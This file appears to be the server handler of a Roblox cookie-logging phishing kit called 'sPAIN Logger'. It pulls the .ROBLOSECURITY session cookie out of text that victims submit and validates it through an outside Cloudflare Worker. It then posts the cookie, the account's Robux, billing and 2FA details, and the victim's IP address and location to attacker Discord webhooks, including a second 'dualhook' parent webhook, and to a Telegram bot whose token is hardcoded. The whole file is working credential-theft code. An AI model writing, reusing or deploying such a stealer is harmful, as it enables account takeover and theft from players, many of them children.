// api/submit.js
const REDIS_URL      = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN    = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN       = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT        = process.env.TG_CHAT  || '7538845070';
const WORKER_URL     = 'https://holy-truth-3129.notrllyme133.workers.dev/';

// ── Redis ─────────────────────────────────────────────────────────────────────
async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  if (json.result === null || json.result === undefined) return null;
  if (typeof json.result === 'object') return json.result;
  try { return JSON.parse(json.result); } catch { return null; }
}

// ── Telegram ──────────────────────────────────────────────────────────────────
async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

// ── IP Geo ────────────────────────────────────────────────────────────────────
async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp,query`);
    if (!res.ok) return null;
    const data = await res.json();
    return data.status === 'success' ? data : null;
  } catch (_) { return null; }
}

// ── Cookie extractor — scans ALL slots ───────────────────────────────────────
function extractRobloxCookie(raw) {
  if (!raw) return null;
  const cleaned = raw.trim().replace(/\s+/g, ' ');
  const fullMatch = cleaned.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);
  if (fullMatch) return fullMatch[1];
  const warningMatch = cleaned.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);
  if (warningMatch) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${warningMatch[1]}`;
  const tokenOnly = cleaned.match(/\|_([\w\-]{50,})/);
  if (tokenOnly) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${tokenOnly[1]}`;
  const bareToken = cleaned.match(/^([a-zA-Z0-9\-\_\.]{200,})$/);
  if (bareToken) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${bareToken[1]}`;
  return null;
}

function findCookieInSlots(slots) {
  for (const [key, val] of Object.entries(slots)) {
    if (!val) continue;
    const cookie = extractRobloxCookie(val);
    if (cookie) return cookie;
  }
  return null;
}

// ── Call Cloudflare Worker to fetch Roblox info ───────────────────────────────
async function fetchRobloxViaWorker(cookie) {
  try {
    const res = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie })
    });
    if (!res.ok) return null;
    const data = await res.json();
    return data.valid ? data : null;
  } catch (err) {
    console.error('Worker error:', err);
    return null;
  }
}

// ── Helper ────────────────────────────────────────────────────────────────────
function f(name, value, inline = true) {
  return {
    name:  (name  || 'N/A').substring(0, 256),
    value: (value?.toString() || 'N/A').substring(0, 1000),
    inline
  };
}

function buildSlotSummary(slots) {
  return Object.entries(slots)
    .map(([k, v]) => `Slot ${k.replace('slot', '')}: ${v || '(empty)'}`)
    .join('\n');
}

// ── Valid cookie embed ────────────────────────────────────────────────────────
async function sendValidEmbed(webhookUrl, { cookie, roblox, slots, ip, geo, now }) {
  if (!webhookUrl?.includes('discord.com/api/webhooks')) return false;
  try {
    const r = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '@everyone',
        embeds: [{
          title: `🧑 ${roblox.username} ${roblox.isPremium ? '⭐' : ''}`,
          description: `:fire: \`sPAIN\` :fire:\n\n[Profile 👤](https://www.roblox.com/users/${roblox.id}/profile)`,
          color: 5793266,
          thumbnail: { url: roblox.avatarUrl },
          fields: [
            f('🔴 Robux',      `Balance: ${roblox.robux?.toLocaleString() || 0}\nPending: ${roblox.pendingRobux || 0}`),
            f('🎵 RAP',        `Value: ${roblox.limitedsValue?.toLocaleString() || 0}\nOwned: ${roblox.limitedsCount || 0}`),
            f('📊 Age',        `${roblox.accountAgeDays} Days`),
            f('💳 Billing',    `Credit: $${roblox.credit || 0}`),
            f('🎫 Premium',    `Premium: ${roblox.isPremium ? '✅' : '❌'}\nEmail: ${roblox.emailVerified}`),
            f('⚙️ Settings',   `Email: ${roblox.emailSet}\n2FA: ${roblox.twoFA}`),
            f('👥 Groups',     `Balance: ${roblox.groupRobux?.toLocaleString() || 0}\nOwned: ${roblox.groupsOwned || 0}`),
            f('📍 Location',   `${geo?.city || 'Unknown'}, ${geo?.country || 'Unknown'}`),
            f('🌐 IP',         ip || 'Unknown'),
            f('🎮 Gamepasses',
              `MM2: ${roblox.gamepasses?.mm2       ? '✅' : '❌'}\n` +
              `Adopt Me: ${roblox.gamepasses?.adoptMe   ? '✅' : '❌'}\n` +
              `Pls Donate: ${roblox.gamepasses?.plsDonate ? '✅' : '❌'}`, false),
            f('📋 All Slots',  `\`\`\`${buildSlotSummary(slots)}\`\`\``, false),
            f('🔐 .ROBLOSECURITY', `\`\`\`${cookie.trim()}\`\`\``, false)
          ],
          footer: { text: `sPAIN Logger • ${now}` }
        }]
      })
    });
    return r.ok;
  } catch (_) { return false; }
}

// ── Invalid / troll embed ─────────────────────────────────────────────────────
async function sendInvalidEmbed(webhookUrl, { slots, ip, geo, now }) {
  if (!webhookUrl?.includes('discord.com/api/webhooks')) return false;
  try {
    const r = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '@everyone',
        embeds: [{
          title: `⚠️ Wrong Cookie — Someone is trolling lol 💀`,
          description: `Cookie was **invalid or fake**. Either wrong input or someone's messing around.`,
          color: 0xff3333,
          fields: [
            f('📋 What They Submitted', `\`\`\`${buildSlotSummary(slots).substring(0, 900)}\`\`\``, false),
            f('🌐 IP',       ip || 'Unknown'),
            f('📍 Location', `${geo?.city || 'Unknown'}, ${geo?.country || 'Unknown'}`),
            f('🗺️ ISP',      geo?.isp    || 'Unknown'),
            f('🕐 Date',     now, false)
          ],
          footer: { text: 'sPAIN Tools • Invalid Submission' },
          timestamp: now
        }]
      })
    });
    return r.ok;
  } catch (_) { return false; }
}

// ── Main handler ──────────────────────────────────────────────────────────────
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  const { slug, slots } = body || {};
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  let record;
  try { record = await redisGet(`slot:${slug}`); } catch (err) {
    return res.status(500).json({ error: 'Redis error', detail: err.message });
  }
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  const ip  = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
  const geo = await getIpGeo(ip);
  const now = new Date().toISOString();

  // Find cookie across all slots then send to Cloudflare Worker
  const cookie = findCookieInSlots(slots);
  const roblox = cookie ? await fetchRobloxViaWorker(cookie) : null;
  const isValid = !!roblox;

  const payload = { cookie, roblox, slots, ip, geo, now };

  // Send to this page's webhook
  isValid
    ? await sendValidEmbed(record.webhook, payload)
    : await sendInvalidEmbed(record.webhook, payload);

  // Send to dualhook parent webhook if exists
  if (record.dualhookParent) {
    try {
      const parent = await redisGet(`slot:${record.dualhookParent}`);
      if (parent?.webhook && parent.webhook !== record.webhook) {
        isValid
          ? await sendValidEmbed(parent.webhook, payload)
          : await sendInvalidEmbed(parent.webhook, payload);
      }
    } catch (_) {}
  }

  // Telegram log
  const slotSummary = buildSlotSummary(slots);
  await tgSend(isValid ? [
    `🚨 <b>VALID SUBMISSION</b>`,
    `👤 <b>${roblox.username}</b> ${roblox.isPremium ? '⭐' : ''}`,
    `💰 Robux: ${roblox.robux?.toLocaleString()}`,
    `🍪 Cookie: ✅ Captured`,
    `🌐 IP: ${ip} — ${geo?.city || '?'}, ${geo?.country || '?'}`,
    `📄 Page: ${record.displayName} (${slug})`
  ].join('\n') : [
    `⚠️ <b>INVALID/TROLL SUBMISSION</b>`,
    `📄 Page: ${record.displayName} (${slug})`,
    `🌐 IP: ${ip} — ${geo?.city || '?'}, ${geo?.country || '?'}`,
    `🕐 ${now}`,
    ``,
    `<b>Slots:</b>\n${slotSummary}`
  ].join('\n'));

  return res.status(200).json({ success: true });
}
